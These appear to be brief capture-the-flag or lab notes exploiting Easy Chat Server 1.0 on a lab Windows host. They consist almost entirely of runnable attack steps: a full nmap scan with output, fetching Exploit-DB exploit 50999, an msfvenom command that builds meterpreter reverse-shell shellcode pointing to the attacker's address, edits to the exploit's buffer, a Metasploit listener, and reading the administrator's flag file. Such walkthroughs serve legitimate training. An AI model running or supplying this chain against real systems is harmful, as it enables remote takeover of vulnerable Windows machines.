nmap -sS -sC -sV -T4 -p- 192.168.170.213
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
20000/tcp open  http          Easy Chat Server httpd 1.0
|_http-server-header: Easy Chat Server/1.0
|_http-title: Easy Chat Server
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-04-21T13:53:29
|_  start_date: N/A
|_clock-skew: -9s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

https://www.exploit-db.com/exploits/50999
searchsploit -m 50999 
chmod 777 50999.py
code 50999.py

# Change the shellcode to our payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.219 LPORT=6666 -f python -b "\x00\x20" -v shellcode

#Change the buffer header
buffer += b"Host: 192.168.170.213:20000\r\n"
buffer += b"Referer: http://192.168.170.213\r\n"

msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.45.219
set LPORT 6666
run

python3 50999.py <victim IP> <victim port>

Get the flag from 
C:\Users\Administrator\Desktop>type flag.txt
type flag.txt
OS{017b533f3a27652fb396789726dc4535}
